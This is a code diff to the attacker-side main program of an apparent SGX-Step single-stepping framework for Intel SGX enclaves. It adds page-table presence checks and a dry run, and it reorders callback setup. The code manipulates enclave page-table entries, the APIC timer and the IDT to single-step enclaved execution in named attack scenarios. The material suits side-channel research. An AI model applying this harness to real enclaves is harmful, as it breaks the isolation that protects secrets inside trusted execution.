@@ -102,7 +102,7 @@ void aep_cb_func(void)
 /* Called upon SIGSEGV caused by untrusted page tables. */
 void fault_handler(int signal)
 {
-	info("Caught fault %d! Restoring enclave page permissions..", signal);
+    info("Caught fault %d! Restoring enclave page permissions..", signal);
     *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
     ASSERT(fault_cnt++ < 10);
 
@@ -118,7 +118,7 @@ void attacker_config_runtime(void)
     ASSERT( !claim_cpu(VICTIM_CPU) );
     ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );
     ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
-	print_system_settings();
+    print_system_settings();
 
     if (isatty(fileno(stdout)))
     {
@@ -127,7 +127,6 @@ void attacker_config_runtime(void)
         info("precise single-stepping results...");
     }
 
-    register_aep_cb(aep_cb_func);
     register_enclave_info();
     print_enclave_info();
 }
@@ -141,6 +140,7 @@ void attacker_config_page_table(void)
         SGX_ASSERT( get_str_adrs( eid, &str_adrs) );
         info("enclave string adrs at %p", str_adrs);
         ASSERT( pte_str_encl = remap_page_table_level( str_adrs, PTE) );
+        ASSERT( PRESENT(*pte_str_encl) );
     #endif
 
     #if (ATTACK_SCENARIO == STRLEN)
@@ -156,10 +156,13 @@ void attacker_config_page_table(void)
     ASSERT( pte_encl = remap_page_table_level( code_adrs, PTE) );
     #if SINGLE_STEP_ENABLE
         *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
+        print_pte(pte_encl);
+        ASSERT( PRESENT(*pte_encl) );
     #endif
 
     //print_page_table( get_enclave_base() );
     ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
+    ASSERT( PRESENT(*pmd_encl) );
 }
 
 /* ================== ATTACKER MAIN ================= */
@@ -167,17 +170,24 @@ void attacker_config_page_table(void)
 /* Untrusted main function to create/enter the trusted enclave. */
 int main( int argc, char **argv )
 {
-	sgx_launch_token_t token = {0};
+    sgx_launch_token_t token = {0};
     int apic_fd, encl_strlen = 0, updated = 0, vec=0;
     idt_t idt = {0};
 
-   	info_event("Creating enclave...");
-	SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
-                                    &token, &updated, &eid, NULL ) );
+    info_event("Creating enclave...");
+    SGX_ASSERT( sgx_create_enclave( "./Enclave/encl.so", /*debug=*/1,
+                                &token, &updated, &eid, NULL ) );
+
+    /* 0. dry run */
+    info("Dry run to allocate pages");
+    SGX_ASSERT( do_zigzagger(eid, NUM_RUNS) );
+    SGX_ASSERT( do_strlen(eid, &encl_strlen, NUM_RUNS) );
+    SGX_ASSERT( do_nop_slide(eid) );
 
     /* 1. Setup attack execution environment. */
     attacker_config_runtime();
     attacker_config_page_table();
+    register_aep_cb(aep_cb_func);
 
     info_event("Establishing user-space APIC/IDT mappings");
     map_idt(&idt);
@@ -185,7 +195,7 @@ int main( int argc, char **argv )
     apic_timer_oneshot(IRQ_VECTOR);
 
     /* 2. Single-step enclaved execution. */
-    info("calling enclave: attack=%d; num_runs=%d; timer=%d",
+    info_event("calling enclave: attack=%d; num_runs=%d; timer=%d",
         ATTACK_SCENARIO, NUM_RUNS, SGX_STEP_TIMER_INTERVAL);
 
     #if (ATTACK_SCENARIO == ZIGZAGGER)
